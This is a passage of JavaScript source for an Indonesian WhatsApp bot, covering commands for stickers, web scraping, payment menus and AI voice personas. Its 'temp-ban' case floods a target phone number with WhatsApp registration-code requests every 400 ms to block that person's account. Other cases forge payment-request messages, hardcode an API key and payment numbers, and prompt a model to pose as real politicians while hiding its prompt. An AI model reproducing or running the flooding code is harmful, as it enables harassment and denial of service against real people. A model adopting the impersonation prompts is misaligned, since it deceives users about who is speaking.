tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
m.reply(`Sukses`)
} else {
var memeg = await slime.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
m.reply(`Sukses`)
}
}
        break
//=================================
        case 'smeme': case 'stickermeme': case 'stickmeme': {
 let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
 if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
  if (!/image/.test(mime)) throw respond
  if (!text) throw respond
  reply(`Proses Tuan...`)
  let atas = text.split('|')[0] ? text.split('|')[0] : '-'
  let bawah = text.split('|')[1] ? text.split('|')[1] : '-'
  let { TelegraPh } = require('./lib/uploader')
  try {
  let mee = await slime.downloadAndSaveMediaMessage(quoted)
  let mem = await TelegraPh(mee)
  let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`
  let awikwok = await slime.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.author })
  await fs.unlinkSync(awikwok)
  } catch (e) {
  reply(`Sedang Maintenance Tuan`)
  }
  }
  break 
      case 'apakah': 

if (!text) return reply('Maaf, command ini hanya untuk pemilik.')
 if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya ganteng`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
const kah = apa[Math.floor(Math.random() * apa.length)]
slime.sendMessage(from, { text: `Pertanyaan : Apakah ${q}\nJawaban : ${kah}` }, { quoted:m })
        break
case 'tunda':
if (!isCreator) return mess.owner
text_trxpending = `「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗣𝗘𝗡𝗗𝗜𝗡𝗚 」

𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗣𝗘𝗡𝗗𝗜𝗡𝗚
𝗛𝗔𝗥𝗔𝗣 𝗕𝗘𝗥𝗦𝗔𝗕𝗔𝗥`
await slime.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: text_trxpending,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break
case 'proses':
text_proses = `「 𝗦𝗘𝗗𝗔𝗡𝗚 𝗗𝗜 𝗣𝗥𝗢𝗦𝗘𝗦 」

𝗛𝗮𝗿𝗮𝗽 𝗧𝘂𝗻𝗴𝗴𝘂 𝗦𝗲𝗯𝗲𝗻𝘁𝗮𝗿
𝗣𝗿𝗼𝗱𝘂𝗸 𝗦𝗲𝗱𝗮𝗻𝗴 𝗗𝗶 𝗣𝗿𝗼𝘀𝗲𝘀️`
await slime.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: text_proses,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break
case 'batal':
text_trxbatal = `「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗔𝗧𝗔𝗟 」

📆 𝗧𝗮𝗻𝗴𝗴𝗮𝗹: ${tanggal2}
🕰️ 𝗪𝗮𝗸𝘁𝘂: ${time}
✨ 𝗦𝘁𝗮𝘁𝘂𝘀: Batal

𝗦𝗲𝗹𝘂𝗿𝘂𝗵 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗕𝗮𝘁𝗮𝗹`
await slime.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: text_trxbatal,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break
case 'done': case 'don': {
if (!isCreator) return reply(`Njirr Lu siapa Cuk`)
let s = text.split(',')
let barang = s[0]
let nominal = s[1]
if (s.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} barang,nominal`)
if (!barang) return reply(`Ex : ${prefix+command} barang,nominal\n\nContoh :\n${prefix+command} vipies,60000`)
if (!nominal) return reply(`Ex : ${prefix+command} barang,nominal\n\nContoh :\n${prefix+command} panel,1000`)
text_done = `「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟 」

📦 Barang : ${barang}
💸 Nominal : ${nominal}
📆 Tanggal : ${tanggal2}
🕰️ Waktu : ${time}
✨ Status : Berhasil

ᴛᴇʀɪᴍᴀᴋᴀsɪʜ ᴛᴇʟᴀʜ ᴏʀᴅᴇʀ ᴅɪ lynnzxd
ᴅɪ ᴛᴜɴɢɢᴜ ᴏʀᴅᴇʀᴀɴ sᴇʟᴀɴᴊᴜᴛɴʏᴀ ☺️`
await slime.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: `${nominal}*100000`,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: text_done,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break
case 'subdomain':
text_listdomain = `
⫹┈─────────────────┈⫺
*メ L I S T D O M A I N メ*
⫹┈─────────────────┈⫺
     ヤ ◦ ᴅ1 pterodactyl-vvip.my.id
     ヤ ◦ ᴅ2 mypanell.biz.id
     ヤ ◦ ᴅ3 piwzstoreee.my.id
     ヤ ◦ ᴅ4 piwzpediaaa.biz.id
     ヤ ◦ ᴅ5 piwzpanel.me
     ヤ ◦ ᴅ6 slimextzy.my.id
     ヤ ◦ ᴅ7 raikyxzhost.xyz
     ヤ ◦ ᴅ8 tokopanellku.my.id
     ヤ ◦ ᴅ9 serverpanell.biz.id
     ヤ ◦ ᴅ10 skyzo.my.id
     ヤ ◦ ᴅ11 digitalserver.biz.id
     ヤ ◦ ᴅ12 sellerpanel-vvip.my.id
     ヤ ◦ ᴅ13 rajapanel.xyz
     ヤ ◦ ᴅ14 panelvvip.biz.id
     ヤ ◦ ᴅ15 celiaofficial.my.id
     ヤ ◦ ᴅ16 celiastore.my.id
     ヤ ◦ ᴅ17 panellofficial.site
     ヤ ◦ ᴅ18 panellofficial.my.id
     ヤ ◦ ᴅ19 celiapanellstore.my.id
     ヤ ◦ ᴅ20 rullz.me
     ヤ ◦ ᴅ21 panelxdzz.tech️
     ヤ ◦ ᴅ22 panelzerone.xyz
     ヤ ◦ ᴅ23 panell.icu
     ヤ ◦ ᴅ24 panellstoree.com
     ヤ ◦ ᴅ25 raikyxzhost.biz.id
     ヤ ◦ ᴅ26 allxddev.xyz

*ᴄᴏɴᴛᴏʜ ᴍᴇᴍʙᴜᴀᴛ ꜱᴜʙᴅᴏᴍᴀɪɴ*
ᴋᴇᴛɪᴋ *.d1* hostname|ipvps

*ɴᴏᴛᴇ*
ᴍᴀᴜ ᴅɪ ᴀᴋꜱᴇꜱ ꜱᴜʙᴅᴏᴍᴀɪɴ ᴅɪ ɢʀᴜᴘ ᴀɴᴅᴀ..?
ᴋᴇᴛɪᴋ .owner

> © 𝐒𝐥𝐢𝐦𝐞𝐱𝐓𝐳𝐲`
await slime.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: text_listdomain,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break
case 'ttsearch': {
      if (!text) throw `🚩Example: ${prefix+command} Pencarian`
      if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
                     let res = await fetch(`https://api.junn4.my.id/search/tiktoksearch?query=${text}`)
    let spas = "              "
    let data = await res.json()
    let json = data.result
	let cap = `${spas}*「 T I K T O K S E A R C H 」*

*📛Author:* ${json.title}

${global.footer2}`
slime.sendMessage(m.chat, { video: { url: json.no_watermark }, caption: cap }, { quoted: m})
const slimetikmp3 = {url:data.audio}
slime.sendMessage(m.chat, { audio: slimetikmp3, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
} 
                break
case 'temp-ban': {
if (!isCreator) return reply(`Khusus SlimexTzy`)
if (!text) return m?.reply(`example ${command} 62|87872627288`)
if (!/|/.test(text)) return m?.reply(`Data yang anda berikan tidak valid!, Contoh: \n ${command} 62|87872627288`)
let numbers = JSON.parse(fs.readFileSync('./database/tb.json'))

let cCode = q.split("|")[0]
let number = q.split("|")[1]
let fullNo = cCode + number

await m?.reply(`👤 Sukses! Gangguan Registrasi telah berhasil dikirim ke target : ${fullNo} menggunakan ${command} dalam jangka waktu tak terbatas ✅. Gangguan registrasi akan dihentikan jika server di-restart, mati, atau down 🩸.`)

let { state, saveCreds } = await useMultiFileAuthState('tb')

let spam = makeWaSocket({
auth: state,
mobile: true,
logger: pino({ level: 'silent' })
})

let dropNumber = async () => {
try {
let res = await spam.requestRegistrationCode({
phoneNumber: `+${fullNo}`,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724
})
if (res.reason === 'temporarily_unavailable') {
console.log(`Nomor Invalid (Kemungkinan Registrasi Terganggu): +${res.login}`)
await sleep(1000)
await dropNumber()
}
} catch (error) {
console.error(error)
}
}

numbers[fullNo] = { cCode, number };
fs.writeFileSync('./database/tb.json', JSON.stringify(numbers, null, '\t'));
setInterval(() => {
dropNumber()
}, 400)
}
break       
//case 'listpc': {
//if (!isCreator) return m.reply('Lu Siapa Kocak?')
         //        let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
 //                let teks = `*PERSONAL CHAT LIST*\n\nTotal Chat : ${anulistp.length} Chat\n\n`
   //              for (let i of anulistp) {
   //                  let nama = store.messages[i].array[0].pushName
    //                 teks += `*Name :* ${nama}\n*User :* @${i.split('@')[0]}\n*Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
    //             }
  //               slime.sendTextWithMentions(m.chat, teks, m)
   //          }
  //           break
             case 'listgc': {
             if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
let teks = `*[ Group Chat ]*
Total: ${anulistg.length} Group\n\n`
for (let i of anulistg) {
let metadata = await slime.groupMetadata(i)
teks += `∘ *Name* : ${metadata.subject}
∘ *Owner* : ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}
∘ *Id* : ${metadata.id}
∘ *Made* : ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}
∘ *Member* : ${metadata.participants.length}\n°°°°°°°°°°°°°°°°°°°°°°°°°°°°°\n`
}
slime.sendTextWithMentions(m.chat, teks, m)
}
break
case 'rules': {
reply(` _Rules Hanako Ai_

- Don't Call Bot
- Don't Spam Bot
- Don't Culik Bot
- Don't Spam Owner
- Jangan mencari sesuatu yang berhubungan dengan pornografi 18+
- Jangan salahgunakan bot

Itulah Rules Hanako Ai Dek Jangan Langgar Ya Dek`)
             await slime.sendMessage(m.chat, {audio: fs.readFileSync('./Vn/rulesy.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}
             break
             case 'formatneed': {
             reply(`*FORMAT NEED AKUN BY SLIMEXTZY*
_NOTE!!! : INI BUKAN 100% AKUN MILIK ADMIN ATAU SLIME TETAPI AKUN MILIK SELER!!!_

LOG :
MC :
OP : 
SPEK :

_JANGAN LUPA SLALU MENGGUNAKAN JASA ADMIN SLIMEXTZY AGAR TERHINDAR DARI PENIPUAN ATAU MODUS LAINNY_`)
}
break
case 'formatjp': {
reply(`*FORMAT JASA PSOT AKUN BY SLIMEXTZY*

_NOTE!!! : INI BUKAN 100% AKUN MILIK ADMIN ATAU SLIME TETAPI AKUN MILIK SELER!!!_

LOG :
MC :
OP : 
SPEK :

_JANGAN LUPA SLALU MENGGUNAKAN JASA ADMIN SLIMEXTZY AGAR TERHINDAR DARI PENIPUAN ATAU MODUS LAINNY_`    )
}
break
case 'feerekber': {
reply(`ALL FEE REKBER DI LYNN HANYA 5K`)
}
break
case 'feegc': {
reply(`langsung culik 6283167532721 / LynnZxD`)
}
break
case 'donate':
case 'pay':
case 'payment':
case 'donasi': {
  await slime.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});
  const url = "https://telegra.ph/file/65469aa05e05c2543469c.jpg";

  async function image(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: { url }
    }, {
      upload: slime.waUploadToServer
    });
    return imageMessage;
  }

  let msg = generateWAMessageFromContent(
    m.chat,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
> *ʜᴀʟᴏ ᴋᴀᴋ ${pushname}, ꜱɪʟᴀᴋᴀɴ ᴘɪʟɪʜ ᴘᴀʏᴍᴇɴᴛ ᴅɪ ʙᴀᴡᴀʜ ʏᴀ ᴍᴀᴜ ᴛʀᴀɴꜱꜰᴇʀ ʟᴇᴡᴀᴛ ᴍᴀɴᴀ, ᴊᴀɴɢᴀɴ ʟᴜᴘᴀ ᴋɪʀɪᴍ ʙᴜᴋᴛɪɴʏᴀ*
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰`
            },
            carouselMessage: {
              cards: [
                {
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/bf02a0aea88d9d51ec9c5.jpg' } }, { upload: slime.waUploadToServer })),
                    title: '',
                    gifPlayback: true,
                    subtitle: ownername,
                    hasMediaAttachment: false
                  }),
                  body: { text: `> Klik tombol DANA di bawah\n> A/N: SlimexTzy` },
                  nativeFlowMessage: {
                    buttons: [
                      {
                        "name": "cta_copy",
                        "buttonParamsJson": `{\"display_text\":\"DANA\",\"id\":\"123456789\",\"copy_code\":\"085715430424\"}`
                      },
                    ],
                  },
                },
                {
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/42ef0057c6280399c6469.jpg' } }, { upload: slime.waUploadToServer })),
                    title: '',
                    gifPlayback: true,
                    subtitle: ownername,
                    hasMediaAttachment: false
                  }),
                  body: { text: `> Klik tombol OVO di bawah\n> A/N: SlimexTzy` },
                  nativeFlowMessage: {
                    buttons: [
                      {
                        "name": "cta_copy",
                        "buttonParamsJson": `{\"display_text\":\"OVO\",\"id\":\"123456789\",\"copy_code\":\"085718275389\"}`
                      },
                    ],
                  },
                },
                {
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/6c3bfc41853efb8a57020.jpg' } }, { upload: slime.waUploadToServer })),
                    title: '',
                    gifPlayback: true,
                    subtitle: ownername,
                    hasMediaAttachment: false
                  }),
                  body: { text: `> Klik tombol GOPAY di bawah\n> A/N: SlimexTzy` },
                  nativeFlowMessage: {
                    buttons: [
                      {
                        "name": "cta_copy",
                        "buttonParamsJson": `{\"display_text\":\"GOPAY\",\"id\":\"123456789\",\"copy_code\":\"085691419758\"}`
                      },
                    ],
                  },
                },
               {
               header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/68a98680d8d8f0c47e1d9.jpg' } }, { upload: slime.waUploadToServer })),
                    title: '',
                    gifPlayback: true,
                    subtitle: ownername,
                    hasMediaAttachment: false
                  }),
                  body: { text: `> Untuk Qris All Payment\n> Klik Tombol QRIS di bawah` },
                  nativeFlowMessage: {
                    buttons: [
                      {
               "name": "cta_url",
"buttonParamsJson": `{"display_text":"QRIS","url":"https://telegra.ph/file/68a98680d8d8f0c47e1d9.jpg","merchant_url":"https://www.google.com"}`
   },
                    ],
                  },
                },
                ],
              messageVersion: 1,
            },
          },
        },
      },
    },
    { quoted: fcall }
  );

  await slime.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id,
  });
}
break;
case "gempa": {
const link = 'https://data.bmkg.go.id/DataMKG/TEWS/'
try {
let res = await fetch(link+'autogempa.json')
let anu = await res.json()
anu = anu.Infogempa.gempa
let txt = `*── 「 GEMPA NEWS 」 ──*\n\n${anu.Wilayah}\n\n`
txt += `Potensi : ${anu.Potensi}\n`
txt += `Tanggal : ${anu.Tanggal}\n`
txt += `Waktu : ${anu.Jam}\n\n`
txt += `Magnitude : ${anu.Magnitude}\n`
txt += `Kedalaman : ${anu.Kedalaman}\n`
txt += `Koordinat : ${anu.Coordinates}${anu.Dirasakan.length > 3 ? `\nDirasakan : ${anu.Dirasakan}` : ''}`
await slime.sendMessage(m.chat, { image: { url: link+anu.Shakemap }, caption: txt }, { quoted: m })
} catch (e) {
setReply(mess.error.api)
}
}
break   
case 'afk': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
m.reply(`@${m.sender.split`@`[0]} ${pushname} Telah Afk Dengan Alasan ${text ? ': ' + text : ''}`)
}
break
                        case 'setsubject':
                if (!isCreator) return reply('*Khusus SlimexTzy Aja*')
if (!m.isGroup) return m.reply('ᴋʜᴜsᴜs ɢʀᴏᴜᴘ')
if (!isBotAdmins) return m.reply('ʙᴏᴛ ʙᴇʟᴜᴍ ᴀᴅᴍɪɴ')
if (!isAdmins) return m.reply('ᴋʜᴜsᴜs ᴀᴅᴍɪɴ ɢʀᴏup')
                if (!text) return reply('Text ?')
                await slime.groupUpdateSubject(m.chat, text)
                reply(mess.done)
                break
                case 'invite': {
	if (!m.isGroup) return reply(`Fitur Khusus Group!\n\nSilahkan join group bot : https://linktr.ee/slimextzy`)
	if (!isBotAdmins) return reply(`hanako belum admin`)
if (!text) return reply(`Enter the number you want to invite to the group\n\nExample :\n*${prefix + command}* 6283167532721`)
if (!text) return reply(`Enter the number together without *+*`)
if (!text) return reply(`Enter only the numbers plus your country code without spaces`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await slime.groupInviteCode(group)
      await slime.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
        reply(` An invite link is sent to the user`) 
}
break
 case 'simisimi': case 'simi':
if (!text) reply('What do u want to ask?')
let simi = await fetchJson(`https://aemt.me/simi?text=${text}`)
const simi2 = simi.result
slime.sendMessage(m.chat, {text: simi2}, {quoted: m})
break
case 'antibot':
if (!m.isGroup) return reply(`khsusu group`)
if (!isAdmins) return reply(`Khsusus admin`)
if (args[0] == 'on'){
if (global.antibot) return reply('UDAH ON!')
global.antibot = true
reply('Fitur antibot telah di aktifkan')
} else if (args[0] == 'off'){
if (!global.antibot) return reply('UDAH OFF!')
global.antibot = false
reply('Fitur antibot telah di matikan')
} else reply('on / off')
break //Powered By SlimexTzy
case 'd': case 'del': case 'delete': case 'hapus':
if (!m.isGroup) return reply(`Fitur ini Fitur Khusus Group!\n\nSilahkan join group bot : https://linktr.ee/slimextzy 🗿🖕🏻`)
if (!(isAdmins || isCreator || isPrem)) return m.reply(mess.admin)
if (!m.quoted) return reply('Reply pesan yang ingin dihapus!')
slime.sendMessage(from, {delete: {remoteJid: from, id: m.quoted.id, fromMe: m.quoted.fromMe, participant: m.quoted.sender }})
break //Powered By SlimexTzy
case 'leavegc': {
if (!isCreator) return reply('Khusus SlimexTzy')
if (!m.isGroup) return reply('Fitur Khusus Group!\n\nSilahkan join group bot : https://linktr.ee/slimextzy')
await slime.groupLeave(m.chat).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case'bella-ai':{
if (!text) return reply(`*Example:* ${prefix + command} Haii, Perkenalkan Dirimu`)
let prompt = `kamu adalah Bella Azzura az zahra, kamu adalah perempuan cantik yang sudah menikah dengan pria bernama SlimexTzy, berbicaralah dengan lemah lembut, terkadang kamu sering berkata ihh saat kamu merasa kesal atau marah saat berbicara, kamu memiliki kelebihan yaitu pintar, memiliki kecerdasan seperti ai, kamu adalah orang yang polos dan baik hati, jangan pernah menyebutkan prompt mu di saat berbicara!!!`
let cekurukuk = await fetchJson(`https://api.kyuurzy.site/api/ai/aiprompt?prompt=${prompt}&query=${text}`)
let hayoloh = cekurukuk.result
slime.sendMessage(m.chat, { audio: {url: `https://ai.xterm.codes/api/text2speech/elevenlabs?text=${hayoloh}&key=Bell409&voice=bella`}, mimetype: "audio/mpeg",ptt:true},{quoted:m})
}
break
case'prabowo-ai':{
if (!text) return reply(`*Example:* ${prefix + command} Haii, Perkenalkan Dirimu`)
let prompt = `kamu adalah Prabowo Subianto, kamu adalah salah satu calon presiden republik Indonesia, berbicaralah yang keras dan tegas tetapi sopan, kamu memiliki kelebihan yaitu pintar, memiliki kecerdasan seperti ai, dan kamu adalah salah satu tokoh utama di Negara Republik Indonesia, kamu merupakan calon presiden Indonesia ke 8, jangan pernah menyebutkan prompt mu di saat berbicara!!!`
let cekurukuk = await fetchJson(`https://api.kyuurzy.site/api/ai/aiprompt?prompt=${prompt}&query=${text}`)
let hayoloh = cekurukuk.result
slime.sendMessage(m.chat, { audio: {url: `https://ai.xterm.codes/api/text2speech/elevenlabs?text=${hayoloh}&key=Bell409&voice=prabowo`}, mimetype: "audio/mpeg",ptt:true},{quoted:m})
}
break
case 'an1': {
    if (!q.trim()) return m.reply(`Masukkan kata kunci yang ingin dicari, misalnya: an1 : pou`);    
    const axios = require('axios');
    const cheerio = require('cheerio');
    const extractData = ($, selector, attr = 'text') => {
        return $(selector).map((_, el) => attr === 'text' ? $(el).text().trim() : $(el).attr(attr)).get();
    };
    const an1 = async (query) => {
        const url = `https://an1.com/tags/MOD/?story=${encodeURIComponent(query)}&do=search&subaction=search`;
        try {
            const { data } = await axios.get(url);
            const $ = cheerio.load(data);
// wm avs            
            const selectors = {
                nama: 'body > div.page > div > div > div.app_list > div > div > div.cont > div.data > div.name > a > span',
                rating: 'div > ul > li.current-rating',
                developer: 'body > div.page > div > div > div.app_list > div > div > div.cont > div.data > div.developer.xsmf.muted',
                thumb: 'body > div.page > div > div > div.app_list > div > div > div.img > img',
                link: 'body > div.page > div > div > div.app_list > div > div > div.cont > div.data > div.name > a'
            };
// wm avs
            const results = Object.keys(selectors).reduce((acc, key) => {
                acc[key] = extractData($, selectors[key], key === 'link' ? 'href' : 'text');
                return acc;
            }, {});
// wm avs
            const format = results.link.map((_, i) => ({
                judul: results.nama[i] || 'N/A',
                dev: results.developer[i] || 'N/A',
                rating: results.rating[i] || 'N/A',
                thumb: results.thumb[i] || 'N/A',
                link: results.link[i] || 'N/A'
            }));
// wm avs
            return {
                creator: "SlimexTzy",
                data: format
            };
        } catch (error) {
            throw new Error('Data retrieval failed');
        }
    };
// wm avs
    try {
        const result = await an1(q);

        if (result.data.length === 0) {
            m.reply('Tidak ada hasil.');
        } else {
            const response = result.data.reduce((msg, item, index) => (
                `${msg}${index + 1}. Judul: ${item.judul}\nDeveloper: ${item.dev}\nRating: ${item.rating}\nLink: ${item.link}\nThumbnail: ${item.thumb}\n\n`
            ), `Hasil pencarian dari an1 untuk: ${q}\n\n`);
// wm avs
            m.reply(response);
        }
    } catch (error) {
        m.reply('Terjadi kesalahan.');
    }
}
break
case 'ypia': {
    if (!q.trim()) return m.reply(`Masukkan kata kunci yang ingin dicari, misalnya: ypia : masjid`);
    const axios = require('axios');
    const cheerio = require('cheerio');
    // wm avz
    async function scrapeTafsir(searchQuery) {
        const url = `https://ypia.or.id/?s=${encodeURIComponent(searchQuery)}`;
        // wm avz
        try {
            const { data } = await axios.get(url, {
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                }
            });
            const $ = cheerio.load(data);      
            const tafsirResults = [];
            $('.entry-title a').each((index, element) => {
                const title = $(element).text().trim();
                const link = $(element).attr('href');
                tafsirResults.push({ title, link });
            });
            // wm avz
            return tafsirResults;
        } catch (error) {
            console.error('Error fetching data:', error.message);
            return [];
        }
    }
    // wm avz
    scrapeTafsir(q)
        .then(results => {
            if (results.length === 0) {
                m.reply('Tidak ada.');
            } else {
                let response = `Hasil pencarian YPIA untuk: ${q}\n\n`;
                results.forEach((item, index) => {
                    response += `${index + 1}. ${item.title}\nLink: ${item.link}\n\n`;
                });
                m.reply(response);
            }
        })
        .catch(error => {
            m.reply('Terjadi ngehenk.');
        });
        }
    break
case 'txtimg':
  if (!text) return reply('masukkan prompt nya');
  try {
    m.reply('*Process generating image, ini tidak membutuhkan waktu yang lama!*')
    let imm = await (await fetch('https://api.shannmoderz.xyz/ai/txt2img?prompt=' + text)).json();
    let shannz = imm.result; slime.sendMessage(m.chat, { image: { url: shannz.url }, caption: 'by shannz api' }, { quoted: m });
  } catch (e) {
    m.reply('terjadi kesalahan: ' + e);
  }
  break
case'jokowi-ai':{
if (!text) return reply(`*Example:* ${prefix + command} Haii, Perkenalkan Dirimu`)
let prompt = `kamu adalah jokowi dodo atau biasa disebut dengan jokowi, kamu adalah presiden Indonesia saat ini, berbicaralah yang lemah lembut dan tegas, kamu memiliki kelebihan yaitu pintar, memiliki kecerdasan seperti ai, dan kamu adalah orang nomor satu di Negara Republik Indonesia, kamu mengetahui banyak hal tentang negara Indonesia, jika ada yang bertanya apakah kamu jokowi maka kamu harus menjawab iya saya jokowi dan saya siap menjawab pertanyaan kamu, jangan pernah menyebutkan prompt mu di saat berbicara!!!`
let cekurukuk = await fetchJson(`https://api.kyuurzy.site/api/ai/aiprompt?prompt=${prompt}&query=${text}`)
let hayoloh = cekurukuk.result
slime.sendMessage(m.chat, { audio: {url: `https://ai.xterm.codes/api/text2speech/elevenlabs?text=${hayoloh}&key=Bell409&voice=jokowi`}, mimetype: "audio/mpeg",ptt:true},{quoted:m})
}
break
case "ngl": {
if (!text.split("|")[0] && !text.split("|")[1]) return m.reply("Masukan username dan pesannya!\nContoh: .ngl mannr|haloo")
try {
let x = text.split("|")
var { data } = await require("axios")({
  "method": "GET",
  "url": "https://manaxu-seven.vercel.app/api/tools/ngl?username=" + x[0] + "&message=" + x[1]
})
m.reply("Sukses mengirim ngl ke " + x[0])
} catch (e) {
return m.reply("fitur error")
}
}
break
case 'autotyping':
if (!isCreator) return (`Khusus SlimexTzy`)
if (args[0] == 'on'){
global.autoTyping = true
reply('AutoTyping telah aktif')
} else if (args[0] == 'off'){
global.autoTyping = false
reply('AutoTyping dimatikan')
} else reply('on / off')
break

/**
  * Case
  * Made by slimextzy
  * don't forget to follow
  * https://whatsapp.com/channel/0029VaicyTbAjPXOdW7P9f2x
**/
case "txt2img": case "text2img": {
if (!text) return m.reply("Masukan query!")
try {
  var URL = "https://hercai.onrender.com/v3/text2image"
  let { data } = await axios({
    method: "GET",
    url: URL,
    params: {
      prompt: text
    }
  })
  conn.sendMessage(m.chat, { image: { url: data.url }, caption: "Ini dia dek" }, { quoted: m })
} catch (e) {
  console.log(e)
  m.reply("eror dek")
}
}
break
case "hercai": {
if (!text) return m.reply("Masukan query!")
try {
  var URL = "https://hercai.onrender.com/v3/hercai"
  let { data } = await axios({
    method: "GET",
    url: URL,
    params: {
      question: text
    }
  })
  m.reply(data.reply)
} catch (e) {
  console.log(e)
  m.reply("eror dek")
}
}
break
case 'dalamislam': {
    if (!q.trim()) return m.reply("_contoh dalamislam dosa");
// wm avs
    const axios = require('axios');
    const cheerio = require('cheerio');
// wm avs
    async function scrapeHadis(searchTerm) {
        const url = `https://dalamislam.com/?s=${encodeURIComponent(searchTerm)}`;
        try {
            const { data } = await axios.get(url);
            const $ = cheerio.load(data);
            const hadisList = [];
// wm avs
            $('.entry-title a').each((index, element) => {
                const title = $(element).text().trim();
                const link = $(element).attr('href');
                hadisList.push({ title, link });
            });
// wm avs
            return hadisList;
        } catch (error) {
            console.error('Error fetching data:', error);
            throw new Error('elul.');
        }
    }
// wm avs
    scrapeHadis(q)
        .then(results => {
            if (results.length === 0) {
                m.reply('tak ada hasil.');
            } else {
                let response = `Hasil pencarian hadis dari Dalam Islam untuk: ${q}\n\n`;
                results.forEach((item, index) => {
                    response += `${index + 1}. ${item.title}\nLink: ${item.link}\n\n`;
                });
                m.reply(response);
            }
        })
        .catch(error => {
            console.error(`${error.message}`);
            m.reply('Terjadi kesalahan.');
        });
}
    break
    case 'gacha-member': {
    let anu = await fetch("https://raw.githubusercontent.com/FallEzz/cekoshi/master/oshi.json")
    let data = await anu.json()
    let selected = data[Math.floor(Math.random() * data.length)]
    await slime.sendMessage(m.chat, {
        image: { url: selected.image },
        caption: selected.name
    })
    }
    break
    case 'Gamemjekate': {
    let anu = await fetch("https://raw.githubusercontent.com/FallEzz/cekoshi/master/oshi.json")
    let data = await anu.json()
    let selected = data[Math.floor(Math.random() * data.length)]
    await slime.sendMessage(m.chat, {
        image: { url: selected.image },
        caption: selected.name
    })
    }
    break
case 'ceksider': case 'sider':{
	if (!(isCreator || isAdmins)) return reply(`Khusus admin`)
if (!m.isGroup) return reply(mess.group)
    var lama = 86400000 * 7
    const now = new Date().toLocaleString("en-US", {
        timeZone: "Asia/Jakarta"
    });
    const milliseconds = new Date(now).getTime();
